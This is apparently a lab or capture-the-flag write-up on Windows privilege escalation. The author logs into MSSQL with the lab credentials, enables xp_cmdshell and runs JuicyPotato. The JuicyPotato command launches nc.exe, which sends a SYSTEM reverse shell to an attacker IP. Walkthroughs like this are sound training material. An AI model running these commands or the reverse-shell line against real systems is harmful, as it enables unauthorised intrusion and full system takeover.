# [SeImpersonate and SeAssignPrimaryToken](SeImpersonate%20and%20SeAssignPrimaryToken.md)
### Escalate privileges using one of the methods shown in this section. Submit the contents of the flag file located at c:\Users\Administrator\Desktop\SeImpersonate\flag.txt

Using the credentials `sql_dev:Str0ng_P@ssw0rd!`

```shell
mssqlclient.py sql_dev@10.129.43.43 -windows-auth
```
![](Screenshot%202026-08-18%20at%2017.38.13.png)

I enabled xp_cmdshell and confirmed the access
![](Screenshot%202026-08-18%20at%2017.39.32.png)

Checked privileges
![](Screenshot%202026-08-18%20at%2017.40.23.png)

I started a Netcat listener and executed JuicyPotato to obtain a SYSTEM shell.

```shell
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```
![](Screenshot%202026-08-18%20at%2017.43.30.png)
